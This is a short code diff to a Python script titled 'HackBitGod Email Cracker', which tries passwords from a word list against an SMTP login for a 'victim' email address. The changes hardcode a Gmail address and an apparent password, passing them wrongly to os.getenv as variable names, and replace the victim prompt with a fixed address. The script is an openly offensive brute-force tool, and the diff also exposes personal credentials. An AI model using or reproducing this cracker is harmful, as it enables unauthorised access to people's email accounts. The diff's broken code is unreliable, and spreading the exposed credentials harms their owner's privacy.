@@ -51,8 +51,8 @@ def connect_to_smtp_server():
 try:
     smtpserver = connect_to_smtp_server()
     
-    email_user = os.getenv('EMAIL_USER')
-    email_pass = os.getenv('EMAIL_PASS')
+    email_user = os.getenv('anirali.nikzadeh1378@gmail.com')
+    email_pass = os.getenv('amirali45781236')
     
     smtpserver.login(email_user, email_pass)
     logging.info("Logged in successfully.")
@@ -78,7 +78,7 @@ except Exception as e:
 print (bcolors.BOLD + "HackBitGod Email Cracker" + bcolors.ENDC)
 print (bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
  
-user = raw_input("Enter The Victim's Email Address: ")
+user = raw_input("amirali.nikzadeh1378@gmail.com ")
 passwfile = "psw.list"
 passwfile = open(passwfile, "r")
  
